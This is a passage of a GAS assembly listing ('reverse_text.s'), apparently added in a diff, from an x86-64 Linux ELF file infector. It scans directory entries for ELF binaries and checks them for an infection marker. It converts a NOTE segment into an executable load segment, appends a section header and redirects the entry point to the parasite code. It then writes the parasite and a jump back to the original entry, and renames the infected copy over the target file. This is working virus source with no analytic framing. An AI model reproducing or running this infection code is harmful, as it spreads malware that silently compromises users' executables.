+ 436 0546 488985A8 	        mov %rax,-0x958(%rbp)
+ 436      F6FFFF
+ 437 054d 48898570 	        mov %rax,-0x990(%rbp)#ldseg_maxaddr
+ 437      F6FFFF
+ 438 0554 4C898D78 	        mov %r9,-0x988(%rbp)#p_maxvaddr_ldseg
+ 438      F6FFFF
+ 439              	 
+ 440              	        ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop1_test_2_jne_out:
+ 441              	       # movq %r9,-0x988(%rbp) #//p_maxvaddr_ldseg(Elf64_Phdr*,0x08,-0x988(%rbp))
+ 442 055b 488B8570 	        mov -0x990(%rbp),%rax #ldseg_maxaddr
+ 442      F6FFFF
+ 443 0562 498B4910 	        mov 0x10(%r9),%rcx #p_phdr_ent->p_vaddr
+ 444 0566 4839C1   	        cmp %rax,%rcx
+ 445 0569 7E0E     	        jle ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop1_cmp_vaddr_out
+ 446 056b 48898D70 	        mov %rcx,-0x990(%rbp)#ldseg_maxaddr
+ 446      F6FFFF
+ 447 0572 4C898D78 	        mov %r9,-0x988(%rbp)#p_maxvaddr_ldseg 
+ 447      F6FFFF
+ 448              	
+ 449              	        ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop1_cmp_vaddr_out:
+ 450 0579 418B4104 	        mov 0x04(%r9),%eax #p_hdr->p_flags,0x04
+ 451 057d B9010000 	        mov $1,%ecx
+ 451      00
+ 452 0582 C1E102   	        sal $2,%ecx
+ 453 0585 83F101   	        xor $1,%ecx  #PF_R | PF_X
+ 454 0588 21C8     	        and %ecx,%eax
+ 455 058a 39C8     	        cmp %ecx,%eax
+ 456 058c 0F8524FF 	        jne ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1
+ 456      FFFF
+ 457              	
+ 458              	        ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_find_text:
+ 459 0592 488D0500 	        leaq _start(%rip), %rax
+ 459      000000
+ 460 0599 488D0DBF 	        leaq osis_reverse_magic(%rip),%rcx
+ 460      070000
+ 461 05a0 4829C1   	        subq %rax,%rcx
+ 462 05a3 498B4108 	        mov 0x08(%r9),%rax #p_offset
+ 463 05a7 4801C1   	        add %rax,%rcx
+ 464 05aa 488B85D8 	        mov -0x928(%rbp),%rax #file_mem,0x08
+ 464      F6FFFF
+ 465 05b1 488B0C08 	        mov (%rax,%rcx),%rcx
+ 466 05b5 48B81032 	        mov $0x9876543210,%rax
+ 466      54769800 
+ 466      0000
+ 467 05bf 4839C8   	        cmpq %rcx, %rax
+ 468 05c2 0F84F303 	        je ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_out_1
+ 468      0000
+ 469              	
+ 470 05c8 498B4130 	        mov 0x30(%r9),%rax #p_align,0x08
+ 471 05cc 4883F800 	        cmp $0,%rax
+ 472 05d0 7C0E     	        jl ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_find_text_cmp_1_jl
+ 473 05d2 488985A0 	        mov %rax,-0x960(%rbp) #obj_pgsize
+ 473      F6FFFF
+GAS LISTING ./reverse_text.s 			page 12
+
+
+ 474 05d9 48898598 	        mov %rax,-0x968(%rbp) #obj_align
+ 474      F6FFFF
+ 475              	
+ 476              	        ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_find_text_cmp_1_jl: 
+ 477              	        ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_find_text_cmp_1_out: 
+ 478 05e0 498B4120 	         mov 0x20(%r9),%rax #p_filesz
+ 479 05e4 488B8DA0 	         mov -0x960(%rbp),%rcx #obj_pgsize
+ 479      F6FFFF
+ 480 05eb 48F7F1   	         divq %rcx
+ 481 05ee 4885D2   	         test %rdx,%rdx
+ 482 05f1 7403     	         je ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_find_text_test_2_je
+ 483 05f3 48FFC0   	         incq %rax
+ 484              	
+ 485              	         ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_find_text_test_2_je: 
+ 486              	         ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_find_text_test_2_je_out:
+ 487              	         ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_cmp_p_type_load_out:
+ 488 05f6 E9BBFEFF 	         jmp ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1
+ 488      FF
+ 489              	
+ 490              	
+ 491              	
+ 492              	
+ 493              	
+ 494              	
+ 495              	
+ 496              	
+ 497              	        ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_out:
+ 498              	        ._start_out_get_dirent_bpos_integrate_target_phdr:
+ 499 05fb 8B8594F6 	        mov -0x96c(%rbp),%eax
+ 499      FFFF
+ 500 0601 85C0     	        test %eax,%eax
+ 501 0603 0F84B203 	        je ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_out_1
+ 501      0000
+ 502 0609 8B85B4F6 	        mov -0x94c(%rbp),%eax
+ 502      FFFF
+ 503 060f 85C0     	        test %eax,%eax
+ 504 0611 0F84A403 	        je ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_out_1 
+ 504      0000
+ 505 0617 4C8B8D80 	        mov -0x980(%rbp),%r9 #p_fist_noteseg
+ 505      F6FFFF
+ 506 061e 4C8B8588 	        mov -0x978(%rbp),%r8 #dname_filesz
+ 506      F6FFFF
+ 507 0625 4983C040 	        add $0x40,%r8 #add len of new sh 
+ 508 0629 B9010000 	        mov $1,%ecx
+ 508      00
+ 509 062e 418909   	        mov %ecx,0x00(%r9) #p_type 
+ 510 0631 B9050000 	        mov $5,%ecx
+ 510      00
+ 511 0636 41894904 	        mov %ecx,0x04(%r9) #p_flags
+ 512 063a 4D894108 	        mov %r8,0x08(%r9) #p_offset
+ 513 063e 488BB578 	        mov -0x988(%rbp),%rsi #p_maxvaddr_ldseg
+ 513      F6FFFF
+ 514 0645 488B4E10 	        mov 0x10(%rsi),%rcx #p_vaddr
+ 515 0649 488B4628 	        mov 0x28(%rsi),%rax #p_memsz
+ 516 064d 4801C8   	        add %rcx,%rax
+ 517 0650 488B7E30 	        mov 0x30(%rsi),%rdi #p_align
+ 518 0654 4831D2   	        xor %rdx,%rdx
+GAS LISTING ./reverse_text.s 			page 13
+
+
+ 519 0657 48F7F7   	        divq %rdi
+ 520 065a 4885D2   	        test %rdx,%rdx
+ 521 065d 7403     	        je ._start_out_get_dirent_bpos_integrate_target_phdr_test_1_out
+ 522 065f 48FFC0   	        inc %rax
+ 523              	
+ 524              	        ._start_out_get_dirent_bpos_integrate_target_phdr_test_1_out: 
+ 525 0662 488B4E30 	        mov 0x30(%rsi),%rcx #p_align
+ 526 0666 4831D2   	        xor %rdx,%rdx
+ 527 0669 48F7E1   	        mulq %rcx #obj_align
+ 528              	        /*********add code address to the file offset modulo p_offset**************/
+ 529 066c 4831D2   	        xor %rdx,%rdx
+ 530 066f 4989C2   	        mov %rax,%r10
+ 531 0672 498B4108 	        mov 0x08(%r9) ,%rax#p_offset
+ 532 0676 48F7F1   	        div %rcx
+ 533 0679 4901D2   	        add %rdx,%r10
+ 534 067c 4C89D0   	        mov %r10,%rax
+ 535              	        /**********************************************/
+ 536 067f 49894110 	        mov %rax,0x10(%r9) #p_vaddr
+ 537 0683 49894118 	        mov %rax,0x18(%r9) #p_paddr
+ 538 0687 48898558 	        mov %rax,-0x9a8(%rbp) #new_sec_vaddr
+ 538      F6FFFF
+ 539 068e 488B45F0 	        mov -0x10(%rbp),%rax #parasite_size
+ 540 0692 4883C010 	        add $0x10,%rax #add len of jmp code
+ 541 0696 49894120 	        mov %rax,0x20(%r9) #p_filesz
+ 542 069a 49894128 	        mov %rax,0x28(%r9) #p_memsz
+ 543 069e 488B8598 	        mov -0x968(%rbp),%rax #obj_align
+ 543      F6FFFF
+ 544 06a5 49894130 	        mov %rax,0x30(%r9)
+ 545              	
+ 546              	        ._start_out_get_dirent_bpos_integrate_target_shdr:
+ 547              	        
+ 548              	        ._start_out_get_dirent_bpos_integrate_target_shdr_check_ehdr:
+ 549 06a9 4C8B95D0 	        mov -0x930(%rbp),%r10 #dname_ehdr 
+ 549      F6FFFF
+ 550 06b0 4831C9   	        xor %rcx,%rcx
+ 551 06b3 66418B4A 	        movw 0x3a(%r10),%cx # e_shentsize ,0x02
+ 551      3A
+ 552 06b8 4831C0   	        xor %rax,%rax
+ 553 06bb 4831D2   	        xor %rdx,%rdx
+ 554 06be 66418B42 	        movw 0x3c(%r10),%ax # e_shnum,0x02
+ 554      3C
+ 555 06c3 48F7E1   	        mulq %rcx
+ 556 06c6 4D8B4228 	        mov 0x28(%r10),%r8 # e_shoff
+ 557 06ca 4901C0   	        add %rax,%r8
+ 558              	
+ 559 06cd 488BB588 	        mov -0x978(%rbp),%rsi #dname_filesz 0x08,st.st_size
+ 559      F6FFFF
+ 560 06d4 4939F0   	        cmp %rsi,%r8
+ 561 06d7 0F85DE02 	        jne ._start_out_get_dirent_bpos_integrate_target_shdr_out_1
+ 561      0000
+ 562              	
+ 563              	       ._start_out_get_dirent_bpos_integrate_target_shdr_alloc_new_shent:
+ 564 06dd 48C7C700 	        mov $0,%rdi
+ 564      000000
+ 565 06e4 E8000000 	        call osis_sbrk
+ 565      00
+ 566 06e9 4883F8FF 	        cmp $-1,%rax
+GAS LISTING ./reverse_text.s 			page 14
+
+
+ 567 06ed 0F84C802 	        je ._start_out_get_dirent_bpos_integrate_target_shdr_alloc_new_shent_out_1
+ 567      0000
+ 568 06f3 48898560 	        mov %rax,-0x9a0(%rbp)#pnew_shent
+ 568      F6FFFF
+ 569 06fa 4C8B95D0 	        mov -0x930(%rbp),%r10 #dname_ehdr 
+ 569      F6FFFF
+ 570 0701 4831C9   	        xor %rcx,%rcx
+ 571 0704 66418B4A 	        movw 0x3a(%r10),%cx # e_shentsize ,0x02
+ 571      3A
+ 572 0709 4889CF   	        mov %rcx,%rdi
+ 573 070c E8000000 	        call osis_sbrk
+ 573      00
+ 574 0711 4883F8FF 	        cmp $-1,%rax
+ 575 0715 0F84A002 	        je ._start_out_get_dirent_bpos_integrate_target_shdr_alloc_new_shent_out_1
+ 575      0000
+ 576 071b 488BBD60 	        mov -0x9a0(%rbp),%rdi
+ 576      F6FFFF
+ 577 0722 48C7C600 	        mov $0,%rsi
+ 577      000000
+ 578 0729 4C8B95D0 	        mov -0x930(%rbp),%r10 #dname_ehdr 
+ 578      F6FFFF
+ 579 0730 4831C9   	        xor %rcx,%rcx
+ 580 0733 66418B4A 	        movw 0x3a(%r10),%cx # e_shentsize ,0x02
+ 580      3A
+ 581 0738 48898D48 	        mov %rcx,-0x9b8(%rbp) #new_shent_size 
+ 581      F6FFFF
+ 582 073f 4889CA   	        mov %rcx,%rdx
+ 583 0742 E8000000 	        call osis_memset_rax
+ 583      00
+ 584              	
+ 585              	         /*
+ 586              	       #  typedef struct
+ 587              	       # {
+ 588              	       #Elf64_Word	sh_name;		/* Section name (string tbl index) */
+ 589              	       #Elf64_Word	sh_type;		/* Section type */
+ 590              	       #Elf64_Xword	sh_flags;		/* Section flags */
+ 591              	       #Elf64_Addr	sh_addr;		/* Section virtual addr at execution */
+ 592              	       #Elf64_Off	sh_offset;		/* Section file offset */
+ 593              	       #Elf64_Xword	sh_size;		/* Section size in bytes */
+ 594              	       #Elf64_Word	sh_link;		/* Link to another section */
+ 595              	       #Elf64_Word	sh_info;		/* Additional section information */
+ 596              	       #Elf64_Xword	sh_addralign;		/* Section alignment */
+ 597              	       #Elf64_Xword	sh_entsize;		/* Entry size if section holds table */
+ 598              	       #} Elf64_Shdr;
+ 599              	       # */
+ 600 0747 4C8B8D60 	       mov -0x9a0(%rbp),%r9
+ 600      F6FFFF
+ 601 074e 4831C9   	       xor %rcx,%rcx
+ 602 0751 418909   	       mov %ecx,0x00(%r9) #sh_name ,0x04
+ 603 0754 B9010000 	       movl $1,%ecx
+ 603      00
+ 604 0759 41894904 	       mov %ecx,0x04(%r9) #sh_type
+ 605 075d 48C7C106 	       mov $06,%rcx
+ 605      000000
+ 606 0764 49894908 	       mov %rcx,0x08(%r9)
+ 607 0768 488B8D58 	       mov -0x9a8(%rbp),%rcx #new_sec_vaddr
+ 607      F6FFFF
+GAS LISTING ./reverse_text.s 			page 15
+
+
+ 608 076f 49894910 	       mov %rcx,0x10(%r9) #sh_addr
+ 609 0773 488B8D88 	       mov -0x978(%rbp),%rcx #dname_filesz
+ 609      F6FFFF
+ 610 077a 4883C140 	       add $0x40,%rcx #add len of new sh  
+ 611 077e 49894918 	       mov %rcx,0x18(%r9) #sh_offset
+ 612 0782 488B4DF0 	       mov -0x10(%rbp),%rcx #parasite_size
+ 613 0786 4883C110 	       add $0x10,%rcx #add len of jmp code
+ 614 078a 49894920 	       mov %rcx,0x20(%r9) #sh_size
+ 615 078e 4831C9   	       xor %rcx,%rcx
+ 616 0791 41894928 	       mov %ecx,0x28(%r9) #sh_link
+ 617 0795 4189492C 	       mov %ecx,0x2c(%r9) #sh_info
+ 618 0799 48C7C110 	       mov $0x10,%rcx
+ 618      000000
+ 619 07a0 49894930 	       mov %rcx,0x30(%r9) #sh_addralign
+ 620 07a4 4831C9   	       xor %rcx,%rcx
+ 621 07a7 49894938 	       mov %rcx,0x38(%r9) #sh_entsize
+ 622              	
+ 623              	       ._start_out_get_dirent_bpos_adjust_target_ehdr:
+ 624 07ab 4C8B8DD0 	        mov -0x930(%rbp),%r9 #dname_ehdr
+ 624      F6FFFF
+ 625 07b2 498B4918 	        mov 0x18(%r9),%rcx #e_entry
+ 626 07b6 48898D40 	        mov %rcx,-0x09c0(%rbp) #old_entry
+ 626      F6FFFF
+ 627 07bd 488B8D58 	        mov -0x9a8(%rbp),%rcx #new_sec_vaddr
+ 627      F6FFFF
+ 628 07c4 49894918 	        mov %rcx,0x18(%r9) #e_entry
+ 629 07c8 66418B49 	        movw 0x3c(%r9),%cx  #
+ 629      3C
+ 630 07cd 480FB7C9 	        movzx %cx,%rcx
+ 631 07d1 66FFC1   	        inc %cx
+ 632 07d4 66418949 	        movw %cx,0x3c(%r9)
+ 632      3C
+ 633              	
+ 634              	
+ 635              	       ._start_out_get_dirent_bpos_generate_file:
+ 636              	
+ 637 07d9 488DBD88 	       leaq -0x878(%rbp),%rdi  #debugMsg3(char[0x400],-0x878(%rbp))
+ 637      F7FFFF
+ 638 07e0 48C7C600 	       mov $0,%rsi
+ 638      000000
+ 639 07e7 48C7C200 	       mov $0x400,%rdx
+ 639      040000
+ 640 07ee E8000000 	       call osis_memset_rax
+ 640      00
+ 641              	
+ 642 07f3 488D7DA8 	       leaq -0x58(%rbp),%rdi
+ 643 07f7 48C7C600 	       mov $0,%rsi
+ 643      000000
+ 644 07fe 48C7C220 	       mov $0x20,%rdx
+ 644      000000
+ 645 0805 E8000000 	       call osis_memset_rax
+ 645      00
+ 646              	
+ 647 080a 488D45A8 	       leaq -0x58(%rbp),%rax
+ 648 080e C60076   	       movb $0x76,(%rax)   #s
+ 649 0811 C6400173 	       movb $0x73,1(%rax)  #v
+ 650 0815 C640022D 	       movb $0x2d,2(%rax)  #_
+GAS LISTING ./reverse_text.s 			page 16
+
+
+ 651 0819 C6400325 	       movb $0x25,3(%rax)  #%
+ 652 081d C6400478 	       movb $0x78,4(%rax)  #x
+ 653 0821 C6400573 	       movb $0x73,5(%rax)  #v
+ 654 0825 C6400600 	       movb $0x00,6(%rax)  #0
+ 655              	
+ 656 0829 488D7DC8 	       leaq -0x38(%rbp),%rdi
+ 657 082d 48C7C600 	       mov $0,%rsi
+ 657      000000
+ 658 0834 48C7C220 	       mov $0x20,%rdx
+ 658      000000
+ 659 083b E8000000 	       call osis_memset_rax
+ 659      00
+ 660              	
+ 661 0840 488D7DC8 	       leaq -0x38(%rbp),%rdi 
+ 662 0844 BA010000 	       movl $1,%edx
+ 662      00
+ 663 0849 48C7C608 	       mov $8,%rsi
+ 663      000000
+ 664 0850 48C7C03E 	       mov $0x13e,%rax #318 __NR_getrandom
+ 664      010000
+ 665 0857 0F05     	       syscall
+ 666              	
+ 667 0859 488DBD88 	       leaq -0x878(%rbp), %rdi
+ 667      F7FFFF
+ 668 0860 48C7C600 	       mov $0x400,%rsi
+ 668      040000
+ 669 0867 488D55A8 	       leaq -0x58(%rbp),%rdx
+ 670 086b 488B4DC8 	       mov -0x38(%rbp),%rcx
+ 671 086f E8000000 	       call osis_snprintf
+ 671      00
+ 672              	
+ 673 0874 488DBD88 	       leaq -0x878(%rbp), %rdi
+ 673      F7FFFF
+ 674 087b 48C7C641 	       mov $0x241,%rsi #O_CREAT | O_WRONLY | O_TRUN 01000|0100|01=01101=0x241
+ 674      020000
+ 675 0882 488D85E8 	       lea -0x918(%rbp),%rax #dname_fd_st
+ 675      F6FFFF
+ 676 0889 8B5018   	       mov 0x18(%rax),%edx #st_mode
+ 677 088c 48C7C002 	       mov $0x02,%rax #open
+ 677      000000
+ 678 0893 0F05     	       syscall
+ 679 0895 4883F8FF 	       cmp $-1,%rax
+ 680 0899 0F841C01 	       je ._start_out_get_dirent_bpos_generate_file_out_1
+ 680      0000
+ 681              	
+ 682 089f 48898550 	       mov %rax,-0x9b0(%rbp)#new_fd
+ 682      F6FFFF
+ 683 08a6 4889C7   	       mov %rax,%rdi
+ 684 08a9 488BB5D8 	       mov -0x928(%rbp),%rsi #file_mem
+ 684      F6FFFF
+ 685 08b0 488B9588 	       mov -0x978(%rbp),%rdx #dname_filesz
+ 685      F6FFFF
+ 686 08b7 48C7C001 	       mov $1,%rax #write
+ 686      000000
+ 687 08be 0F05     	       syscall
+ 688 08c0 4883F8FF 	       cmp $-1,%rax
+ 689 08c4 0F84F100 	       je ._start_out_get_dirent_bpos_generate_file_out_1
+GAS LISTING ./reverse_text.s 			page 17
+
+
+ 689      0000
+ 690              	
+ 691 08ca 488BBD50 	       mov -0x9b0(%rbp),%rdi 
+ 691      F6FFFF
+ 692 08d1 488BB560 	       mov -0x9a0(%rbp),%rsi #pnew_shent
+ 692      F6FFFF
+ 693 08d8 488B9548 	       mov -0x9b8(%rbp),%rdx
+ 693      F6FFFF
+ 694 08df 48C7C001 	       mov $1,%rax #write
+ 694      000000
+ 695 08e6 0F05     	       syscall
+ 696              	
+ 697 08e8 488BBD50 	       mov -0x9b0(%rbp),%rdi
+ 697      F6FFFF
+ 698 08ef 488B75F8 	       mov -0x08(%rbp),%rsi #address_of_main
+ 699 08f3 488B55F0 	       mov -0x10(%rbp),%rdx
+ 700 08f7 48C7C001 	       mov $1,%rax #write
+ 700      000000
+ 701 08fe 0F05     	       syscall
+ 702              	
+ 703 0900 488DBD30 	       lea -0x9d0(%rbp),%rdi#jump_code
+ 703      F6FFFF
+ 704 0907 48C7C690 	       mov $0x90,%rsi
+ 704      000000
+ 705 090e 48C7C210 	       mov $0x10,%rdx
+ 705      000000
+ 706 0915 E8000000 	       call osis_memset_rax
+ 706      00
+ 707              	      
+ 708              	       /* modify by owen jiang for RIP relative addressing 2024.12.19 */
+ 709              	      /* 
+ 710              	       lea -0x9d0(%rbp),%rax
+ 711              	       mov $0x48,%rcx 
+ 712              	       mov %rcx,(%rax)
+ 713              	       mov $0xc7,%rcx
+ 714              	       mov %rcx,0x01(%rax) 
+ 715              	       mov $0xc0,%rcx
+ 716              	       mov %rcx,0x02(%rax) 
+ 717              	       mov -0x09c0(%rbp),%rcx
+ 718              	       mov %ecx,0x03(%rax)
+ 719              	       mov $0xff,%rcx
+ 720              	       mov %rcx,0x07(%rax)
+ 721              	       mov $0xe0,%rcx
+ 722              	       mov %rcx,0x08(%rax)
+ 723              	       */
+ 724              	       
+ 725 091a 488D8530 	       lea -0x9d0(%rbp),%rax
+ 725      F6FFFF
+ 726 0921 48C7C148 	       mov $0x48,%rcx 
+ 726      000000
+ 727 0928 488908   	       mov %rcx,(%rax)
+ 728 092b 48C7C18D 	       mov $0x8d,%rcx
+ 728      000000
+ 729 0932 48894801 	       mov %rcx,0x01(%rax)
+ 730 0936 48C7C105 	       mov $0x05,%rcx
+ 730      000000
+ 731 093d 48894802 	       mov %rcx,0x02(%rax)  
+GAS LISTING ./reverse_text.s 			page 18
+
+
+ 732 0941 488B8D40 	       mov -0x09c0(%rbp),%rcx #old_entry
+ 732      F6FFFF
+ 733 0948 488BBD58 	       mov -0x9a8(%rbp),%rdi #new_sec_vaddr
+ 733      F6FFFF
+ 734 094f 488B75F0 	       mov -0x10(%rbp),%rsi #parasite_size
+ 735 0953 4801F7   	       add %rsi,%rdi
+ 736 0956 4883C707 	       add $0x07,%rdi #lea rip ra addresssing to rax ,the orignal code len is 0x48 +0x8d+0x05 + dis
+ 737 095a 29F9     	       sub %edi,%ecx 
+ 738 095c 894803   	       mov %ecx,0x03(%rax)
+ 739 095f 48C7C1FF 	       mov $0xff,%rcx
+ 739      000000
+ 740 0966 48894807 	       mov %rcx,0x07(%rax)
+ 741 096a 48C7C1E0 	       mov $0xe0,%rcx
+ 741      000000
+ 742 0971 48894808 	       mov %rcx,0x08(%rax) 
+ 743              	       /**********************************************************************/
+ 744              	
+ 745 0975 488BBD50 	       mov -0x9b0(%rbp),%rdi
+ 745      F6FFFF
+ 746 097c 488DB530 	       lea -0x9d0(%rbp),%rsi #jump_code
+ 746      F6FFFF
+ 747 0983 48C7C210 	       mov $0x10,%rdx
+ 747      000000
+ 748 098a 48C7C001 	       mov $1,%rax #write
+ 748      000000
+ 749 0991 0F05     	       syscall
+ 750              	
+ 751 0993 488BBD50 	       mov -0x9b0(%rbp),%rdi
+ 751      F6FFFF
+ 752 099a 48C7C003 	       mov $0x03,%rax #close
+ 752      000000
+ 753 09a1 0F05     	       syscall
+ 754              	       
+ 755 09a3 488DBD88 	       leaq -0x878(%rbp), %rdi 
+ 755      F7FFFF
+ 756 09aa 488BB580 	       movq -0x880(%rbp), %rsi
+ 756      F7FFFF
+ 757 09b1 48C7C052 	       mov  $0x52,%rax #rename
+ 757      000000
+ 758 09b8 0F05     	       syscall
+ 759              	
+ 760 09ba 90       	       nop
+ 761              	
+ 762              	
+ 763              	
+ 764              	
+ 765              	
+ 766              	
+ 767              	   
+ 768              	       
+ 769              	
+ 770              	
+ 771              	
+ 772              	
+ 773              	
+ 774              	
+ 775              	
+GAS LISTING ./reverse_text.s 			page 19
+
+
+ 776              	
+ 777              	
+ 778              	
+ 779              	
+ 780              	
+ 781              	
+ 782              	       
+ 783              	        
+ 784              	
+ 785              	        ._start_out_get_dirent_bpos_anlasize_elf_phdr_fail:
+ 786              	        ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_out_1:
+ 787              	        ._start_out_get_dirent_bpos_integrate_target_shdr_out_1:
+ 788              	        ._start_out_get_dirent_bpos_integrate_target_shdr_alloc_new_shent_out_1:
+ 789              	        ._start_out_get_dirent_bpos_generate_file_out_1:
+ 790 09bb 488BBD78 	         mov -0x888(%rbp),%rdi # dname_fd
+ 790      F7FFFF
+ 791 09c2 48C7C003 	         mov $0x03,%rax #close
+ 791      000000
+ 792 09c9 0F05     	         syscall
+ 793 09cb 488BBDE0 	         mov -0x920(%rbp),%rdi # basic_brk
+ 793      F6FFFF
+ 794 09d2 E8000000 	         call osis_brk
+ 794      00
+ 795 09d7 E985F7FF 	         jmp ._start_out_get_dirent_bpos
+ 795      FF
+ 796              	        
+ 797              	
+ 798              	
+ 799              	
+ 800              	
+ 801              	         
+ 802              	        
+ 803              	
+ 804              	
+ 805              	
+ 806              	
+ 807              	
+ 808              	        /*****************end of process DT_REG***************************************/
+ 809 09dc E980F7FF 	        jmp ._start_out_get_dirent_bpos
+ 809      FF
+ 810              	        
+ 811              	    ._start_out_get_dirent_bpos_out:
+ 812 09e1 E940F7FF 	        jmp ._start_get_dirent 
+ 812      FF
+ 813              	
+ 814              	._start_out_get_dirent:
+ 815 09e6 E9850300 	jmp ._start_endl 
+ 815      00
+ 816              	
+ 817              	
+ 818              	
+ 819              	
+ 820              	
+ 821              	/*********************************osis_memset_rax function****************************************/
+ 822              	osis_memset_rax:
+ 823              	/* The userland implementation is:
+ 824              	   int osis_memset_rax(void* s[.n], int c, size_t n);
+GAS LISTING ./reverse_text.s 			page 20
+
+
+ 825              	
+ 826              	
+ 827              	   The parameters are passed in register from userland:
+ 828              	   rdi: s
+ 829              	   rsi: c
+ 830              	   rdx: n
+ 831              	
+ 832              	*/
+ 833              	.type osis_memset_rax @function
+ 834              	.globl osis_memset_rax
+ 835              	
+ 836 09eb 55       	push %rbp
+ 837 09ec 4889E5   	mov %rsp,%rbp
+ 838 09ef 4883E4F0 	andq $0xfffffffffffffff0,%rsp
+ 839 09f3 4889F9   	mov  %rdi,%rcx
+ 840 09f6 4989D1   	mov %rdx, %r9
+ 841 09f9 4989D2   	mov %rdx, %r10
+ 842 09fc 480FB6C6 	movzbq %sil, %rax
+ 843 0a00 49B80101 	mov $0x0101010101010101,%r8
+ 843      01010101 
+ 843      0101
+ 844 0a0a 4C0FAFC0 	imulq %rax,%r8  # 使用 imulq 指令，64 位常数
+ 845 0a0e 4983F908 	cmpq  $8,%r9
+ 846 0a12 7C18     	jl .omr_001
+ 847              	.omr_000:
+ 848 0a14 4C8907   	movq    %r8, (%rdi)
+ 849 0a17 4983E908 	subq $8,%r9
+ 850 0a1b 4883C708 	addq $8, %rdi 
+ 851 0a1f 4983F908 	cmpq $8, %r9
+ 852 0a23 7C07     	jl .omr_001
+ 853 0a25 EBED     	jmp .omr_000
+ 854 0a27 E9990000 	jmp osis_memset_rax_endl
+ 854      00
+ 855              	
+ 856              	.omr_001:
+ 857 0a2c 4831C0   	xor %rax,%rax
+ 858 0a2f 4831D2   	xor %rdx,%rdx
+ 859 0a32 664489C8 	mov %r9w,%ax
+ 860 0a36 49C7C308 	movq $8,%r11
+ 860      000000
+ 861 0a3d 49F7F3   	divq %r11
+ 862 0a40 4883FA00 	cmp $0,%rdx
+ 863 0a44 742A     	je .omr_001_0
+ 864 0a46 4883FA01 	cmp $1,%rdx
+ 865 0a4a 7429     	je .omr_001_1
+ 866 0a4c 4883FA02 	cmp $2,%rdx
+ 867 0a50 742B     	je .omr_001_2
+ 868 0a52 4883FA03 	cmp $3,%rdx
+ 869 0a56 742E     	je .omr_001_3
+ 870 0a58 4883FA04 	cmp $4,%rdx
+ 871 0a5c 7435     	je .omr_001_4
+ 872 0a5e 4883FA05 	cmp $5,%rdx
+ 873 0a62 7437     	je .omr_001_5
+ 874 0a64 4883FA06 	cmp $6,%rdx
+ 875 0a68 743D     	je .omr_001_6
+ 876 0a6a 4883FA07 	cmp $7,%rdx
+ 877 0a6e 7444     	je .omr_001_7
+GAS LISTING ./reverse_text.s 			page 21
+
+
+ 878              	.omr_001_0:
+ 879 0a70 4889C8   	mov %rcx,%rax
+ 880 0a73 EB50     	jmp osis_memset_rax_endl
+ 881              	.omr_001_1:
+ 882 0a75 448807   	movb %r8b, (%rdi) 
+ 883 0a78 4889C8   	mov %rcx,%rax
+ 884 0a7b EB48     	jmp osis_memset_rax_endl
+ 885              	.omr_001_2:
+ 886 0a7d 66448907 	movw %r8w, (%rdi) 
+ 887 0a81 4889C8   	mov %rcx,%rax
+ 888 0a84 EB3F     	jmp osis_memset_rax_endl
+ 889              	.omr_001_3:
+ 890 0a86 66448947 	movw %r8w, 1(%rdi)
+ 890      01
+ 891 0a8b 448807   	movb %r8b, (%rdi)  
+ 892 0a8e 4889C8   	mov %rcx,%rax
+ 893 0a91 EB32     	jmp osis_memset_rax_endl
+ 894              	.omr_001_4:
+ 895 0a93 448907   	movl %r8d, (%rdi) 
+ 896 0a96 4889C8   	mov %rcx,%rax
+ 897 0a99 EB2A     	jmp osis_memset_rax_endl
+ 898              	.omr_001_5:
+ 899 0a9b 44894701 	movl %r8d, 1(%rdi) 
+ 900 0a9f 448807   	movb %r8b, (%rdi) 
+ 901 0aa2 4889C8   	mov %rcx,%rax
+ 902 0aa5 EB1E     	jmp osis_memset_rax_endl
+ 903              	.omr_001_6:
+ 904 0aa7 44894702 	movl %r8d, 2(%rdi) 
+ 905 0aab 66448907 	movw %r8w, (%rdi) 
+ 906 0aaf 4889C8   	mov %rcx,%rax
+ 907 0ab2 EB11     	jmp osis_memset_rax_endl
+ 908              	.omr_001_7:
+ 909 0ab4 44894703 	movl %r8d, 3(%rdi) 
+ 910 0ab8 66448947 	movw %r8w, 1(%rdi)
+ 910      01
+ 911 0abd 448807   	movb %r8b, (%rdi)  
+ 912 0ac0 4889C8   	mov %rcx,%rax
+ 913 0ac3 EB00     	jmp osis_memset_rax_endl
+ 914              	
+ 915              	osis_memset_rax_endl:
+ 916 0ac5 4889EC   	mov %rbp,%rsp
+ 917 0ac8 5D       	pop %rbp
+ 918 0ac9 C3       	ret
+ 919              	
+ 920              	/********************************end of osis_memset_rax**************************************/
+ 921              	
+ 922              	/*********************************osis_snprintf  function****************************************/
+ 923              	/* osis_snprintf 函数实现
+ 924              	rdi: 目标缓冲区
+ 925              	rsi: 缓冲区大小
+ 926              	rdx: 格式化字符串
+ 927              	rcx: 第一个变参（简化版）仅支持 %d, %s, %x 格式
+ 928              	*/
+ 929              	.type osis_snprintf @function
+ 930              	.global osis_snprintf
+ 931              	osis_snprintf:
+ 932              	    # 保存栈帧
+GAS LISTING ./reverse_text.s 			page 22
+
+
+ 933 0aca 55       	    pushq %rbp
+ 934 0acb 4889E5   	    movq %rsp, %rbp
+ 935 0ace 4883E4F0 	    andq $0xfffffffffffffff0,%rsp
+ 936              	    
+ 937              	    # 保存需要保存的寄存器
+ 938 0ad2 4154     	    pushq %r12
+ 939 0ad4 4155     	    pushq %r13
+ 940 0ad6 4156     	    pushq %r14
+ 941 0ad8 4157     	    pushq %r15
+ 942              	    # 保存参数
+ 943 0ada 4989FC   	    movq %rdi, %r12     # 目标缓冲区
